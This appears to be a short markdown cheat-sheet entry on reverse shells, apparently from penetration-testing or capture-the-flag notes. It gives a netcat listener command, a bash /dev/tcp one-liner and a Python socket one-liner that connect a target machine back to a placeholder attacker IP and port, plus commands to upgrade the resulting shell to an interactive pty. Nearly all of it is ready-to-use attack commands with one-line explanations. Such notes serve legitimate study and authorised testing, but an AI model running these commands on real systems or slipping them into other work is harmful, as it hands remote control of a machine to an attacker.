- ### Reverse Shell
  A Reverse Shell is a type of connection where a target machine initiates a remote shell back to an attacker's system, allowing the attacker to execute
  commands on the target as if they were locally present. It can be easily achieved using [Netcat](https://nmap.org/ncat/).

  #### Local Machine
  ```bash
  nc -lvnp ${PORT}
  ```
  
  #### Remote Machine
  ```bash
  bash -i >& /dev/tcp/${LOCAL_MACHINE_IP}/${PORT} 0>&1
  ```
  or

  ```bash
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR.IP.ADDR.HERE",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```
  
  
<br/>

- ### Bash Spawn <br/>
  Spawns an interactive pseudo-terminal **(pty)** running **/bin/bash**, which upgrades a basic shell to behave more like a fully interactive terminal.
  Useful when doing a Reverse Shell.

  ```bash
  script /dev/null -c bash
  ```
  or
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```  
